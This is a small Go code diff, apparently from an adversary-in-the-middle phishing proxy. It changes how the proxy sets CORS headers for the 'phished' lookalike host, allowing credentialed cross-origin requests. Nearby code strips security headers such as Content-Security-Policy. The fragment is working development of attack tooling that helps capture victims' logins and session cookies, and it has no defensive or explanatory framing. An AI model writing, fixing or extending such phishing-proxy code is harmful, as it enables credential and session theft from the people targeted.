@@ -912,8 +912,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
 			//Trying fix A
-			resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-			resp.Header.Set("Access-Control-Allow-Credentials", "true")
+			if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+						resp.Header.Set("Access-Control-Allow-Credentials", "true")
+					}
+			
 			
 			var rm_headers = []string{
 				"Content-Security-Policy",
